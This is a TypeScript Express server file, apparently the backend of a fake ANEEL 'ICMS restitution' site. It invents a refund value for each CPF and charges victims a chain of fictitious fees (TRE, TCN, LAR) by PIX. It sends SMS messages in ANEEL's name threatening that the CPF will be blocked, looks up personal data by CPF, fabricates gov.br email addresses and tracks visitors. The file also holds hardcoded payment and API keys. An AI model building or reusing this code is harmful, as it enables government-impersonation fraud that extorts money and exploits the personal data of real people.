import { Express, NextFunction, Request, Response } from 'express';
import { Server, createServer } from 'http';
import { getValorRestituicaoByCpf, salvarValorRestituicao, db } from './db';
import { storage } from './storage';
import { insertVisitanteSchema, insertPaginaVisitadaSchema, paginas_visitadas, visitantes } from '@shared/schema';
import { smsService } from './sms-service';

/**
 * API de Pagamentos For4Payments
 * Módulo para integração com o gateway For4Payments
 */

interface PaymentResponse {
  id: string;
  pixCode: string;
  pixQrCode: string;
  expiresAt: string;
  status: string;
}

interface PaymentData {
  amount: number;
  name: string;
  email: string;
  cpf: string;
  phone: string;
}

class For4PaymentsAPI {
  private API_URL = "https://app.for4payments.com.br/api/v1";
  private secretKey: string;
  private publicKey: string;

  constructor(secretKey: string, publicKey: string) {
    this.secretKey = secretKey;
    this.publicKey = publicKey;
  }

  private getHeaders(): Record<string, string> {
    return {
      'Authorization': this.secretKey,
      'X-Public-Key': this.publicKey,
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    };
  }

  async createPixPayment(data: PaymentData): Promise<PaymentResponse> {
    try {
      console.log("[For4Payments] Iniciando criação de pagamento com os dados:", data);

      // Remover formatação adicionais
      const cpfLimpo = data.cpf.replace(/\D/g, '');
      const telefoneLimpo = data.phone.replace(/\D/g, '');
      
      // Converter valor para centavos (exigido pela API For4Payments)
      const valorCentavos = Math.round(data.amount * 100);
      
      // Calcular data de expiração (1 hora à frente)
      const dataExpiracao = new Date();
      dataExpiracao.setHours(dataExpiracao.getHours() + 1);

      // Determinar o título da taxa com base no valor - TODOS EM MAIÚSCULO
      let taxaTitle = "TAXA TRE (1/3)";
      if (data.amount === 118.40) {
        taxaTitle = "TAXA TCN (2/3)";
      } else if (data.amount === 48.60) {
        taxaTitle = "TAXA LAR (3/3)";
      }
      
      // Garantir que o título está em MAIÚSCULO
      taxaTitle = taxaTitle.toUpperCase();

      // Formatar os dados conforme especificação
      const paymentData = {
        "name": data.name,
        "email": data.email,
        "cpf": cpfLimpo,
        "phone": telefoneLimpo,
        "paymentMethod": "PIX",
        "amount": valorCentavos,
        "items": [
          {
            "title": taxaTitle,
            "quantity": 1,
            "unitPrice": valorCentavos,
            "tangible": false
          }
        ],
        "dueDate": dataExpiracao.toISOString()
      };

      console.log("[For4Payments] Enviando dados para API:", JSON.stringify(paymentData));
      console.log("[For4Payments] URL da API:", `${this.API_URL}/transaction.purchase`);
      console.log("[For4Payments] Headers:", JSON.stringify(this.getHeaders()));

      const response = await fetch(`${this.API_URL}/transaction.purchase`, {
        method: "POST",
        headers: this.getHeaders(),
        body: JSON.stringify(paymentData)
      });

      console.log("[For4Payments] Status da resposta:", response.status, response.statusText);

      if (!response.ok) {
        const errorText = await response.text();
        console.log("[For4Payments] Corpo do erro:", errorText);
        
        // Tenta fazer parse do corpo do erro se for JSON
        let errorBody;
        try {
          errorBody = JSON.parse(errorText);
        } catch (e) {
          errorBody = { message: errorText };
        }
        
        console.log("[For4Payments] Erro na resposta:", {
          status: response.status,
          statusText: response.statusText,
          body: errorText
        });
        
        throw new Error(`Erro na API de pagamento (${response.status}): ${errorBody.message || response.statusText}`);
      }

      const responseData = await response.json();
      return {
        id: responseData.id,
        pixCode: responseData.pixCode,
        pixQrCode: responseData.pixQrCode,
        expiresAt: responseData.expiresAt,
        status: responseData.status
      };
    } catch (error) {
      console.log("[For4Payments] Erro:", error);
      throw error;
    }
  }

  async checkPaymentStatus(paymentId: string): Promise<{ status: string }> {
    try {
      console.log("[For4Payments] Verificando status do pagamento:", paymentId);
      
      // Construa a URL com o parâmetro id como parâmetro de consulta
      const url = new URL(`${this.API_URL}/transaction.getPayment`);
      url.searchParams.append('id', paymentId);
      
      const response = await fetch(url.toString(), {
        method: "GET",
        headers: this.getHeaders()
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.log("[For4Payments] Erro ao verificar status:", errorText);
        
        // Para não interromper a experiência do usuário, vamos retornar pending em caso de erro
        if (response.status === 404) {
          console.log("[For4Payments] Pagamento ainda não encontrado, retornando status 'pending'");
          return { status: "pending" };
        }
        
        throw new Error(`Erro ao verificar status do pagamento (${response.status})`);
      }

      const responseData = await response.json();
      console.log("[For4Payments] Resposta do status:", responseData);
      
      // Mapear os status da API para nossos status internos
      const statusMapping: Record<string, string> = {
        'PENDING': 'pending',
        'PROCESSING': 'pending',
        'APPROVED': 'completed',
        'COMPLETED': 'completed',
        'PAID': 'completed',
        'EXPIRED': 'failed',
        'FAILED': 'failed',
        'CANCELED': 'cancelled',
        'CANCELLED': 'cancelled'
      };
      
      const currentStatus = responseData.status || "PENDING";
      return { status: statusMapping[currentStatus] || "pending" };
    } catch (error) {
      console.log("[For4Payments] Erro ao verificar status:", error);
      // Em caso de erro, não interrompa a experiência do usuário
      return { status: "pending" };
    }
  }
}

// Inicialização da API com as chaves fornecidas
const paymentApi = new For4PaymentsAPI(
  "ad6ab253-8ae1-454c-91f3-8ccb18933065", // Secret Key fornecida pelo cliente
  "6d485c73-303b-466c-9344-d7b017dd1ecc"  // Public Key fornecida pelo cliente
);



export async function registerRoutes(app: Express): Promise<Server> {
  // API route for potential simulation endpoints
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', message: 'ANEEL ICMS Restituição API' });
  });
  
  // API para enviar código OTP por SMS
  app.post("/api/enviar-codigo-otp", async (req: Request, res: Response) => {
    try {
      const { telefone, cpf } = req.body;
      
      if (!telefone || !cpf) {
        return res.status(400).json({
          success: false,
          error: "Telefone e CPF são obrigatórios."
        });
      }
      
      console.log(`Solicitação de envio de SMS OTP para telefone: ${telefone}, CPF: ${cpf}`);
      
      // Enviar o código OTP via serviço SMS
      const resultado = await smsService.sendOtpCode(telefone, cpf);
      
      if (!resultado.success) {
        return res.status(500).json({
          success: false,
          error: resultado.message || "Erro ao enviar SMS"
        });
      }
      
      // Em ambiente de desenvolvimento, enviamos o código para facilitar os testes
      if (process.env.NODE_ENV !== 'production') {
        return res.json({
          success: true,
          message: "Código OTP enviado com sucesso",
          code: resultado.code // Apenas para ambiente de desenvolvimento
        });
      }
      
      // Em produção, não enviamos o código na resposta
      return res.json({
        success: true,
        message: "Código OTP enviado com sucesso"
      });
      
    } catch (error) {
      console.error('Erro ao enviar código OTP:', error);
      res.status(500).json({
        success: false,
        error: "Erro ao processar a solicitação de envio de SMS."
      });
    }
  });
  
  // API para verificar código OTP
  app.post("/api/verificar-codigo-otp", async (req: Request, res: Response) => {
    try {
      const { telefone, codigo, cpf } = req.body;
      
      if (!telefone || !codigo || !cpf) {
        return res.status(400).json({
          success: false,
          error: "Telefone, código e CPF são obrigatórios."
        });
      }
      
      console.log(`Verificando código OTP: ${codigo} para telefone: ${telefone}, CPF: ${cpf}`);
      
      // Verificar o código OTP
      const verificado = await smsService.verifyOtpCode(telefone, codigo, cpf);
      
      if (!verificado) {
        return res.status(400).json({
          success: false,
          error: "Código inválido ou expirado."
        });
      }
      
      // Código verificado com sucesso
      return res.json({
        success: true,
        message: "Código verificado com sucesso"
      });
      
    } catch (error) {
      console.error('Erro ao verificar código OTP:', error);
      res.status(500).json({
        success: false,
        error: "Erro ao processar a verificação do código."
      });
    }
  });
  
  /**
   * Endpoint para enviar SMS de notificação personalizada com base na página acessada
   */
  app.post("/api/enviar-sms-notificacao", async (req: Request, res: Response) => {
    try {
      const { telefone, pagina, dados } = req.body;
      
      console.log(`Requisição para envio de SMS notificação recebida:`, {
        telefone,
        pagina,
        dados: {
          ...dados,
          cpf: dados?.cpf ? `***.**.***.${dados.cpf.slice(-2)}` : undefined // Exibe apenas os últimos dígitos do CPF por segurança
        }
      });
      
      if (!telefone || !pagina) {
        return res.status(400).json({ 
          success: false, 
          message: "Telefone e página são obrigatórios" 
        });
      }
      
      // Validar que dados contém as informações necessárias
      if (!dados || !dados.nome || !dados.cpf) {
        return res.status(400).json({ 
          success: false, 
          message: "Dados do usuário incompletos. É necessário nome e CPF." 
        });
      }
      
      // Extrair o primeiro nome
      const primeiroNome = dados.nome.split(' ')[0];
      
      // Formatar o CPF para exibição
      const cpfFormatado = dados.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
      
      // Formatar valor se existir
      const valorFormatado = dados.valor ? dados.valor.toFixed(2).replace('.', ',') : "0,00";
      
      // Determinar a mensagem com base na página acessada
      let mensagem = "";
      
      switch (pagina) {
        case "/pagamento":
          mensagem = `ANEEL Informa: ${primeiroNome}, Sua TRE foi gerada. Pague em ate 20 minutos ou seu CPF sera bloqueado preventivamente, impedindo beneficios do governo por ate 5 anos.`;
          break;
          
        case "/taxa-complementar":
          mensagem = `ANEEL Informa: ${primeiroNome}, O pagamento da TRE foi confirmado. O CPF ${cpfFormatado} foi vinculado ao protocolo de restituicao junto a ANEEL.`;
          break;
          
        case "/pagamento-tcn":
          mensagem = `ANEEL Informa: ${primeiroNome}, Sua TCN foi gerada. O pagamento eh obrigatorio para liberar sua restituicao. Sem o pagamento, o processo sera CANCELADO.`;
          break;
          
        case "/taxa-lar":
          mensagem = `ANEEL Informa: ${primeiroNome}, O pagamento da TCN foi confirmado. Sua solicitacao foi aprovada e sua restituicao esta sendo processada.`;
          break;
          
        case "/pagamento-lar":
          mensagem = `ANEEL Informa: ${primeiroNome}, sua restituicao leva ate 15 dias uteis para ser depositada. Pague a Taxa de Liberacao Acelerada (LAR) para receber em 60min.`;
          break;
          
        case "/sucesso":
          mensagem = `ANEEL Informa: ${primeiroNome}, O pagamento da LAR foi confirmado. Em ate 60min o valor sera enviado para sua chave Pix CPF ${cpfFormatado}.`;
          break;
          
        case "/sucesso-padrao":
          mensagem = `ANEEL Informa: ${primeiroNome}, Voce escolheu aguardar 15 dias. Essa eh sua ultima chance de pagar a Taxa LAR e receber seu valor em ate 60 minutos.`;
          break;
          
        default:
          return res.status(400).json({ 
            success: false, 
            message: "Página não suportada para envio de notificações SMS" 
          });
      }
      
      // Enviar a mensagem via SMS
      const resultado = await smsService.sendNotification(telefone, mensagem);
      
      if (!resultado.success) {
        return res.status(500).json({ 
          success: false, 
          message: resultado.message || "Erro ao enviar notificação SMS"
        });
      }
      
      return res.json({ 
        success: true,
        mensagem: mensagem
      });
    } catch (error) {
      console.error("Erro ao enviar notificação SMS:", error);
      return res.status(500).json({ success: false, message: "Erro interno ao processar requisição" });
    }
  });
  
  // Rota para detectar localização por IP
  app.get('/api/detectar-estado', async (req: Request, res: Response) => {
    try {
      // Obter o IP real do cliente, considerando proxies
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      console.log("Recebida solicitação de detecção de estado");
      
      // Limpar o IP para obter apenas o endereço principal (sem portas ou IPs adicionais)
      let ipLimpo = "";
      if (typeof ip === 'string') {
        ipLimpo = ip.split(',')[0].trim();
      }
      
      // Verificar se há um parâmetro para forçar o estado (apenas para fins de teste específicos)
      const forceDetection = req.query.forceDetection === 'true';
      
      // Para testes, podemos modificar este comportamento para simular diferentes estados
      // mas por padrão vamos deixar o fluxo normal de detecção continuar mesmo com forceDetection
      if (forceDetection) {
        console.log("Teste de detecção solicitado via parâmetro, continuando com detecção normal");
        // Não retornamos mais um valor fixo, deixamos a detecção real acontecer
      }
      
      try {
        // Verificar se o IP é localhost/interno/privado
        const isPrivateIp = (
          ipLimpo === "127.0.0.1" ||
          ipLimpo === "::1" ||
          ipLimpo.startsWith("10.") ||
          ipLimpo.startsWith("172.16.") ||
          ipLimpo.startsWith("172.17.") ||
          ipLimpo.startsWith("172.18.") ||
          ipLimpo.startsWith("172.19.") ||
          ipLimpo.startsWith("172.20.") ||
          ipLimpo.startsWith("172.21.") ||
          ipLimpo.startsWith("172.22.") ||
          ipLimpo.startsWith("172.23.") ||
          ipLimpo.startsWith("172.24.") ||
          ipLimpo.startsWith("172.25.") ||
          ipLimpo.startsWith("172.26.") ||
          ipLimpo.startsWith("172.27.") ||
          ipLimpo.startsWith("172.28.") ||
          ipLimpo.startsWith("172.29.") ||
          ipLimpo.startsWith("172.30.") ||
          ipLimpo.startsWith("172.31.") ||
          ipLimpo.startsWith("192.168.")
        );
        
        // Para IP local/interno, usar a API ipapi.co que funciona sem precisar de token
        const apiUrl = isPrivateIp 
          ? "https://ipapi.co/json/" // API para IP externo do servidor
          : `https://ipapi.co/${ipLimpo}/json/`;
        
        console.log(`Consultando API: ${isPrivateIp ? 'IP público do servidor' : 'IP do usuário'}`);
        
        const response = await fetch(apiUrl, {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json',
            'Cache-Control': 'no-cache'
          }
        });
        
        if (!response.ok) {
          throw new Error(`Erro ao consultar API de geolocalização: ${response.status}`);
        }
        
        const data = await response.json();
        console.log("Dados da API de geolocalização:", data);
        
        // Se não for Brasil ou não tiver região definida
        if (!data.country_code || data.country_code !== 'BR' || !data.region_code) {
          throw new Error("IP não é do Brasil ou região não detectada");
        }
        
        // Log mais detalhado do estado detectado para debug
        console.log(`Estado detectado pelo IP - Código: ${data.region_code}, Nome: ${data.region}`);
                
        // Mapear o código da região para o nome completo do estado
        const siglaParaEstado: Record<string, string> = {
          'AC': 'Acre',
          'AL': 'Alagoas',
          'AP': 'Amapá',
          'AM': 'Amazonas',
          'BA': 'Bahia',
          'CE': 'Ceará',
          'DF': 'Distrito Federal',
          'ES': 'Espírito Santo',
          'GO': 'Goiás',
          'MA': 'Maranhão',
          'MT': 'Mato Grosso',
          'MS': 'Mato Grosso do Sul',
          'MG': 'Minas Gerais',
          'PA': 'Pará',
          'PB': 'Paraíba',
          'PR': 'Paraná',
          'PE': 'Pernambuco',
          'PI': 'Piauí',
          'RJ': 'Rio de Janeiro',
          'RN': 'Rio Grande do Norte',
          'RS': 'Rio Grande do Sul',
          'RO': 'Rondônia',
          'RR': 'Roraima',
          'SC': 'Santa Catarina',
          'SP': 'São Paulo',
          'SE': 'Sergipe',
          'TO': 'Tocantins'
        };
        
        const estado = siglaParaEstado[data.region_code] || "São Paulo";
        
        console.log(`Estado detectado: ${estado} (${data.region_code})`);
        
        return res.json({
          ip: ipLimpo,
          estado: estado,
          detalhes: {
            countryCode: data.country_code,
            regionName: estado,
            regionCode: data.region_code
          }
        });
        
      } catch (apiError) {
        console.error("Erro ao consultar primeira API de geolocalização:", apiError);
        
        try {
          // Tentar com API alternativa (ipinfo.io) como fallback
          console.log("Tentando API alternativa (ipinfo.io)...");
          
          // Se for IP interno, usar sem especificar IP para pegar o IP externo do servidor
          const ipApiUrl = ipLimpo && !ipLimpo.startsWith("127.") && !ipLimpo.startsWith("192.168.") 
            ? `https://ipinfo.io/${ipLimpo}/json` 
            : "https://ipinfo.io/json";
            
          const fallbackResponse = await fetch(ipApiUrl);
          
          if (!fallbackResponse.ok) {
            throw new Error(`Erro na API alternativa: ${fallbackResponse.status}`);
          }
          
          const fallbackData = await fallbackResponse.json();
          console.log("Dados da API alternativa:", fallbackData);
          
          // Se não for Brasil, ou não tiver região definida
          if (fallbackData.country !== 'BR' || !fallbackData.region) {
            throw new Error("IP não é do Brasil ou região não detectada");
          }
          
          // Mapear o código da região para o nome completo do estado
          const siglaParaEstado: Record<string, string> = {
            'AC': 'Acre',
            'AL': 'Alagoas',
            'AP': 'Amapá',
            'AM': 'Amazonas',
            'BA': 'Bahia',
            'CE': 'Ceará',
            'DF': 'Distrito Federal',
            'ES': 'Espírito Santo',
            'GO': 'Goiás',
            'MA': 'Maranhão',
            'MT': 'Mato Grosso',
            'MS': 'Mato Grosso do Sul',
            'MG': 'Minas Gerais',
            'PA': 'Pará',
            'PB': 'Paraíba',
            'PR': 'Paraná',
            'PE': 'Pernambuco',
            'PI': 'Piauí',
            'RJ': 'Rio de Janeiro',
            'RN': 'Rio Grande do Norte',
            'RS': 'Rio Grande do Sul',
            'RO': 'Rondônia',
            'RR': 'Roraima',
            'SC': 'Santa Catarina',
            'SP': 'São Paulo',
            'SE': 'Sergipe',
            'TO': 'Tocantins'
          };
          
          const estado = siglaParaEstado[fallbackData.region] || "São Paulo";
          
          console.log(`Estado detectado via API alternativa: ${estado} (${fallbackData.region})`);
          
          return res.json({
            ip: ipLimpo || fallbackData.ip,
            estado: estado,
            detalhes: {
              countryCode: fallbackData.country,
              regionName: estado,
              regionCode: fallbackData.region
            }
          });
          
        } catch (fallbackError) {
          console.error("Erro também na API alternativa:", fallbackError);
          
          // Se ambas as APIs falharem, usar detecção determinística baseada no IP
          console.log("Ambas as APIs falharam, usando detecção determinística...");
          
          // Lista de estados brasileiros por ordem de população
          const estados = [
            "São Paulo", "Minas Gerais", "Rio de Janeiro", "Bahia", "Rio Grande do Sul",
            "Paraná", "Pernambuco", "Ceará", "Pará", "Santa Catarina",
            "Maranhão", "Goiás", "Amazonas", "Espírito Santo", "Paraíba",
            "Mato Grosso", "Rio Grande do Norte", "Alagoas", "Piauí", "Distrito Federal",
            "Mato Grosso do Sul", "Sergipe", "Rondônia", "Tocantins", "Acre",
            "Amapá", "Roraima"
          ];
          
          let estadoIndex = 0; // São Paulo como default
          
          if (ipLimpo) {
            // Gerar um hash do IP para obter um índice consistente para cada IP
            let hash = 0;
            for (let i = 0; i < ipLimpo.length; i++) {
              hash = ((hash << 5) - hash) + ipLimpo.charCodeAt(i);
              hash |= 0;
            }
            
            hash = Math.abs(hash);
            estadoIndex = hash % estados.length;
          }
          
          const estadoDetectado = estados[estadoIndex];
          console.log(`Usando detecção determinística: ${estadoDetectado}`);
          
          return res.json({
            ip: ipLimpo || "desconhecido",
            estado: estadoDetectado,
            detalhes: {
              countryCode: "BR",
              regionName: estadoDetectado,
              regionCode: obterSiglaEstado(estadoDetectado)
            }
          });
        }
      }
      
    } catch (error) {
      console.error("Erro geral ao processar estado:", error);
      
      // Em caso de erro geral, garantir que sempre retornamos algo válido
      // Por padrão, usamos São Paulo
      const currentIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      let ipAjustado = "";
      if (typeof currentIp === 'string') {
        ipAjustado = currentIp.split(',')[0].trim();
      }

      return res.status(200).json({
        ip: ipAjustado || "desconhecido",
        estado: "São Paulo",
        detalhes: {
          countryCode: "BR",
          regionName: "São Paulo",
          regionCode: "SP" 
        }
      });
    }
  });
  
  // Função auxiliar para obter a sigla do estado
  function obterSiglaEstado(estado: string): string {
    const siglas: Record<string, string> = {
      "Acre": "AC",
      "Alagoas": "AL",
      "Amapá": "AP",
      "Amazonas": "AM",
      "Bahia": "BA",
      "Ceará": "CE",
      "Distrito Federal": "DF",
      "Espírito Santo": "ES",
      "Goiás": "GO",
      "Maranhão": "MA",
      "Mato Grosso": "MT",
      "Mato Grosso do Sul": "MS",
      "Minas Gerais": "MG",
      "Pará": "PA",
      "Paraíba": "PB",
      "Paraná": "PR",
      "Pernambuco": "PE",
      "Piauí": "PI",
      "Rio de Janeiro": "RJ",
      "Rio Grande do Norte": "RN",
      "Rio Grande do Sul": "RS",
      "Rondônia": "RO",
      "Roraima": "RR",
      "Santa Catarina": "SC",
      "São Paulo": "SP",
      "Sergipe": "SE",
      "Tocantins": "TO"
    };
    
    return siglas[estado] || estado.substring(0, 2).toUpperCase();
  }

  // Rota para consultar ou salvar valor de restituição
  app.get('/api/restituicao', async (req: Request, res: Response) => {
    try {
      const { cpf } = req.query;
      
      if (!cpf || typeof cpf !== 'string') {
        return res.status(400).json({ error: 'CPF inválido ou não fornecido' });
      }
      
      // Remover formatação do CPF
      const cpfLimpo = cpf.replace(/\D/g, '');
      
      // Consultar valor no banco de dados
      const valorRestituicao = await getValorRestituicaoByCpf(cpfLimpo);
      
      return res.json({ 
        cpf: cpfLimpo,
        valorRestituicao,
        encontrado: valorRestituicao !== null
      });
    } catch (error) {
      console.error('Erro ao processar consulta de restituição:', error);
      res.status(500).json({ error: 'Erro interno no servidor' });
    }
  });
  
  // Rota para salvar valor de restituição
  app.post('/api/restituicao', async (req: Request, res: Response) => {
    try {
      const { cpf, valor } = req.body;
      
      if (!cpf || typeof cpf !== 'string') {
        return res.status(400).json({ error: 'CPF inválido ou não fornecido' });
      }
      
      if (valor === undefined || isNaN(Number(valor))) {
        return res.status(400).json({ error: 'Valor inválido ou não fornecido' });
      }
      
      // Remover formatação do CPF
      const cpfLimpo = cpf.replace(/\D/g, '');
      
          // Agora a lógica de cálculo determinístico está na função salvarValorRestituicao
      const valorNumerico = Number(valor);
      const sucesso = await salvarValorRestituicao(cpf, valorNumerico);
      
      if (!sucesso) {
        return res.status(500).json({ error: 'Erro ao salvar valor de restituição' });
      }
      
      return res.json({ 
        sucesso: true,
        mensagem: 'Valor de restituição salvo com sucesso'
      });
    } catch (error) {
      console.error('Erro ao processar salvamento de restituição:', error);
      res.status(500).json({ error: 'Erro interno no servidor' });
    }
  });

  // Rota para criar pagamento PIX
  app.post('/api/pagamentos', async (req: Request, res: Response) => {
    try {
      const { nome, cpf, email, telefone, valor } = req.body;
      
      // Validar dados mínimos obrigatórios
      if (!nome || !cpf) {
        return res.status(400).json({ 
          error: 'Dados incompletos', 
          message: 'Os campos nome e CPF são obrigatórios' 
        });
      }
      
      // Valor padrão se não for fornecido - usamos valores fixos de acordo com o tipo de pagamento
      let valorPagamento = valor || 74.90;
      
      // Verifica o referer para determinar qual página fez a solicitação
      const referer = req.get('Referer') || '';
      if (referer.includes('pagamento-tcn')) {
        valorPagamento = 118.40;
        console.log('[For4Payments] Detectado pagamento TCN, usando valor fixo de R$118,40');
      } else if (referer.includes('pagamento-lar')) {
        valorPagamento = 48.60; 
        console.log('[For4Payments] Detectado pagamento LAR, usando valor fixo de R$48,60');
      } else {
        valorPagamento = 74.90;
        console.log('[For4Payments] Usando valor padrão TRE de R$74,90');
      }
      
      try {
        // Remover formatação do CPF
        const cpfLimpo = cpf.replace(/\D/g, '');
        
        // Gerar telefone válido e email formatado para cumprir os requisitos da API
        const telefoneFormatado = telefone || `(11) 9${Math.floor(Math.random() * 9000) + 1000}-${Math.floor(Math.random() * 9000) + 1000}`;
        const emailFormatado = email || `${cpfLimpo.substring(0, 3)}xxx${cpfLimpo.substring(cpfLimpo.length-2)}@restituicao.gov.br`;
        
        console.log('[For4Payments] Enviando pagamento com dados:', {
          valor: valorPagamento,
          nome: nome,
          cpf: cpfLimpo,
          email: emailFormatado,
          telefone: telefoneFormatado
        });
        
        // Criar pagamento na For4Payments
        const pagamento = await paymentApi.createPixPayment({
          amount: valorPagamento,
          name: nome,
          email: emailFormatado,
          cpf: cpfLimpo,
          phone: telefoneFormatado
        });
        
        console.log("[For4Payments] Pagamento criado com sucesso:", pagamento.id);
        
        return res.json({
          id: pagamento.id,
          pixCode: pagamento.pixCode,
          pixQrCode: pagamento.pixQrCode,
          expiresAt: pagamento.expiresAt,
          status: pagamento.status
        });
      } catch (paymentError) {
        console.error("Erro ao processar pagamento:", paymentError);
        return res.status(500).json({ 
          error: "Falha ao processar pagamento", 
          message: paymentError instanceof Error ? paymentError.message : "Erro desconhecido"
        });
      }
    } catch (error) {
      console.error('Erro geral no processamento do pagamento:', error);
      res.status(500).json({ error: 'Erro interno no servidor' });
    }
  });



// Rota para verificar status de pagamento
  app.get('/api/pagamentos/:id/status', async (req: Request, res: Response) => {
    try {
      const { id } = req.params;
      
      if (!id) {
        return res.status(400).json({ error: 'ID do pagamento não fornecido' });
      }
      
      try {
        // Verificar o status do pagamento na API
        const statusResponse = await paymentApi.checkPaymentStatus(id);
        return res.json({ status: statusResponse.status });
      } catch (statusError) {
        console.error(`[For4Payments] Erro ao verificar status do pagamento ${id}:`, statusError);
        
        // Retornar pending para não interromper a experiência do usuário
        return res.json({ status: 'pending' });
      }
    } catch (error) {
      console.error('Erro geral na verificação de status do pagamento:', error);
      res.status(500).json({ error: 'Erro interno no servidor' });
    }
  });

  // Rota para consulta de CPF via API Exato Digital
  app.get("/api/consulta-cpf", async (req: Request, res: Response) => {
    try {
      const { cpf } = req.query;

      if (!cpf || typeof cpf !== "string") {
        return res.status(400).json({ error: "CPF inválido ou não fornecido" });
      }

      const cpfLimpo = cpf.replace(/\D/g, "");

      if (cpfLimpo.length !== 11) {
        return res.status(400).json({ error: "CPF deve conter 11 dígitos" });
      }

      const apiToken = process.env.API_TOKEN_RECEITA || '268753a9b3a24819ae0f02159dee6724';

      if (!apiToken) {
        return res.status(500).json({ error: "Token da API não configurado" });
      }

      const response = await fetch(`https://api.exato.digital/receita-federal/cpf?token=${apiToken}&cpf=${cpfLimpo}&format=json`, {
        method: "GET",
        headers: {
          "Content-Type": "application/json"
        }
      });

      if (!response.ok) {
        let errorBody;
        try {
          errorBody = await response.json();
        } catch {
          errorBody = { message: response.statusText };
        }

        let mensagemErro = "Erro na consulta do CPF";
        if (response.status === 404) {
          mensagemErro = "CPF não encontrado na base de dados";
        } else if (response.status === 401 || response.status === 403) {
          mensagemErro = "Erro de autenticação com a API";
        } else if (response.status >= 500) {
          mensagemErro = "Serviço temporariamente indisponível";
        }

        return res.status(response.status).json({ 
          error: mensagemErro, 
          detalhes: errorBody,
          statusCode: response.status
        });
      }

      const responseText = await response.text();
      const data = responseText.trim() ? JSON.parse(responseText) : null;

      if (!data) {
        return res.status(500).json({ error: "Resposta vazia da API" });
      }
      
      // Verifica e registra os dados para debug
      console.log("[API Receita] Dados recebidos:", JSON.stringify(data, null, 2));
      
      // Garantir que estamos extraindo o campo NomePessoaFisica corretamente
      if (data.Result && data.Result.NomePessoaFisica) {
        console.log(`[API Receita] Nome da pessoa física extraído: "${data.Result.NomePessoaFisica}"`);
      } else {
        console.error("[API Receita] Campo NomePessoaFisica não encontrado na resposta");
      }

      // Se tudo deu certo, verifica se precisamos calcular e armazenar um valor de restituição
      try {
        // Verificar se já existe uma restituição para esse CPF no banco
        const valorRestituicao = await getValorRestituicaoByCpf(cpfLimpo);
        
        // Se não existir, gerar um valor aleatório
        if (valorRestituicao === null) {
          // Gerar valor aleatório entre 1800 e 3600
          const valorMinimo = 1800;
          const valorMaximo = 3600;
          const valorAleatorio = valorMinimo + Math.random() * (valorMaximo - valorMinimo);
          const valorCalculado = Math.round(valorAleatorio * 100) / 100;
          
          console.log(`[API Receita] Gerando valor aleatório para CPF ${cpfLimpo}: ${valorCalculado}`);
          
          // Salvar para uso futuro
          await salvarValorRestituicao(cpfLimpo, valorCalculado);

          // Se os dados da API não tiverem um valor de restituição, adicionar o aleatório
          if (data.Result && !data.Result.ValorRestituicao) {
            data.Result.ValorRestituicao = valorCalculado;
          }
        } else {
          // Se os dados da API não tiverem um valor de restituição, adicionar o existente no banco
          if (data.Result && !data.Result.ValorRestituicao) {
            data.Result.ValorRestituicao = valorRestituicao;
          }
        }
      } catch (dbError) {
        console.error("Erro ao processar valor de restituição:", dbError);
        // Continuamos sem interromper o fluxo, só não teremos o valor de restituição
      }

      // Formatar a data de nascimento como DD/MM/YYYY, independente do formato original
      if (data.Result && data.Result.DataNascimento) {
        try {
          // Criar um objeto Date a partir da string de data
          const dateObj = new Date(data.Result.DataNascimento);
          
          // Verificar se a data é válida
          if (!isNaN(dateObj.getTime())) {
            // Formatar a data completa como DD/MM/YYYY
            const dia = String(dateObj.getDate()).padStart(2, '0');
            const mes = String(dateObj.getMonth() + 1).padStart(2, '0');
            const ano = dateObj.getFullYear();
            const dataFormatada = `${dia}/${mes}/${ano}`;
            
            console.log(`[API Receita] Data de nascimento formatada: ${dataFormatada}`);
            
            // Substituir a data completa pelo formato DD/MM/YYYY
            data.Result.DataNascimento = dataFormatada;
          } else {
            console.log(`[API Receita] Formato de data não reconhecido: ${data.Result.DataNascimento}`);
            
            // Tentar extrair o ano de diferentes formatos de string
            let anoExtraido = null;
            
            // Tentar formato ISO
            if (data.Result.DataNascimento.includes('T')) {
              const isoDatePart = data.Result.DataNascimento.split('T')[0];
              if (isoDatePart.includes('-')) {
                anoExtraido = isoDatePart.split('-')[0];
              }
            } 
            // Tentar formato DD/MM/AAAA
            else if (data.Result.DataNascimento.includes('/')) {
              const parts = data.Result.DataNascimento.split('/');
              if (parts.length === 3) {
                anoExtraido = parts[2];
              }
            }
            // Tentar formato AAAA-MM-DD
            else if (data.Result.DataNascimento.includes('-')) {
              const parts = data.Result.DataNascimento.split('-');
              if (parts.length === 3) {
                anoExtraido = parts[0];
              }
            }
            
            if (anoExtraido && !isNaN(Number(anoExtraido))) {
              console.log(`[API Receita] Ano extraído manualmente: ${anoExtraido}`);
              data.Result.DataNascimento = anoExtraido;
            }
          }
        } catch (dateError) {
          console.error("Erro ao processar data de nascimento:", dateError);
          
          // Se falhar, tentar extrair os primeiros 4 caracteres se parecerem um ano
          const possibleYear = data.Result.DataNascimento.substring(0, 4);
          if (!isNaN(Number(possibleYear)) && Number(possibleYear) > 1900 && Number(possibleYear) < 2025) {
            data.Result.DataNascimento = possibleYear;
          }
        }
      }

      return res.json(data);

    } catch (error) {
      console.error("Erro ao consultar CPF:", error);
      return res.status(500).json({ error: "Erro interno ao processar a consulta" });
    }
  });

  // Rotas para rastreamento de usuários
  
  // Rota para registrar visitante
  app.post('/api/rastreamento/visitante', async (req: Request, res: Response) => {
    try {
      // Validar os dados do corpo da requisição
      const validationResult = insertVisitanteSchema.safeParse(req.body);
      
      if (!validationResult.success) {
        return res.status(400).json({ 
          error: 'Dados inválidos', 
          details: validationResult.error.errors 
        });
      }
      
      // Verificar se o CPF é válido
      const cpf = req.body.cpf;
      if (!cpf || typeof cpf !== 'string' || cpf.replace(/\D/g, "").length !== 11) {
        return res.status(400).json({ error: 'CPF inválido' });
      }
      
      // Verificar se o visitante já existe
      const visitanteExistente = await storage.getVisitanteByCpf(cpf);
      
      if (visitanteExistente) {
        // Atualizar o último acesso do visitante existente
        await storage.updateVisitante(visitanteExistente.id, {
          ultimo_acesso: new Date(),
          // Atualizar outros dados se fornecidos
